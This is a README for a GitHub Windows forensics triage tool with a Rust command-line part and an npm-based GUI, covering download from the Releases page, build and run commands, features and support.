# 📁 DigitalForensics - Easy Digital Forensics Triage Tool

[![Download DigitalForensics](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/ekobagus13/DigitalForensics/releases)

## 🚀 Getting Started

Welcome to DigitalForensics! This guide helps you download and run our application. No programming skills needed.

### 🖥️ System Requirements

- Windows 10 or later
- At least 4 GB of RAM
- 100 MB of free disk space

### 📥 Download & Install

To get started, visit the [Releases page](https://github.com/ekobagus13/DigitalForensics/releases) to download the latest version of DigitalForensics. Look for files marked as releases and choose the one that matches your operating system.

### 🗂️ Project Structure

The project includes two main components:

- **TriageIR-CLI**: The command-line interface for advanced users and automation.
- **TriageIR-GUI**: The graphical user interface for easier access.

## 📥 Downloading the Tool

1. Click on the link to visit the [Releases page](https://github.com/ekobagus13/DigitalForensics/releases).
2. Find the latest version marked "Latest Release."
3. Download the file that suits your system (e.g., .exe for Windows).
4. Once the download completes, locate the file in your Downloads folder.

## 🔍 Using the DigitalForensics Tool

### 📜 How to Use the CLI

The command-line interface (CLI) allows for powerful analysis. Here’s how to use it:

1. Open Command Prompt.
2. Change to the directory where you downloaded the tool:

   ```bash
   cd path\to\TriageIR-CLI
   ```

3. Build the tool by typing the following command:

   ```bash
   cargo build --release
   ```

4. Run the CLI tool with this command:

   ```bash
   .\target\release\triageir-cli.exe --output scan-results.json --verbose
   ```

The tool will output a file named `scan-results.json` containing the results of your scan.

### 📊 How to Use the GUI

The graphical user interface (GUI) is user-friendly. Follow these steps:

1. Open a terminal window.
2. Change to the GUI directory:

   ```bash
   cd path\to\TriageIR-GUI
   ```

3. Install required packages with this command:

   ```bash
   npm install
   ```

4. Launch the GUI:

   ```bash
   npm run dev
   ```

A window will appear, allowing you to conduct your analysis with just a few clicks.

## ⚙️ Features

- **Real-time System Monitoring**: See system activity live.
- **Network Analysis**: Inspect open connections.
- **Process Management**: Check active processes.
- **Event Log Viewing**: Explore Windows event logs.
- **Data Export**: Save results in various formats.

## 🗺️ Exploration Path

- Checkout the **CLI** for in-depth system analysis.
- Use the **GUI** for quick and easy access.
- Explore examples in the `examples` folder inside the `TriageIR-CLI` directory for common usage patterns.

## 📝 Troubleshooting

If you encounter issues, consider the following steps:

- Ensure your system meets the requirements listed above.
- Refer to the command syntax if CLI commands fail.
- Check the Terminal for any error messages and review your commands.

For additional help, you can open an issue in the GitHub repository.

## 📞 Support & Feedback

If you have questions or suggestions, please reach out by creating an issue in the repository. Your feedback helps us improve DigitalForensics.

## 🔗 Additional Resources

- [GitHub Repository](https://github.com/ekobagus13/DigitalForensics)
- [Documentation](https://github.com/ekobagus13/DigitalForensics/wiki)

Thank you for using DigitalForensics! We hope it serves you well in your digital investigations.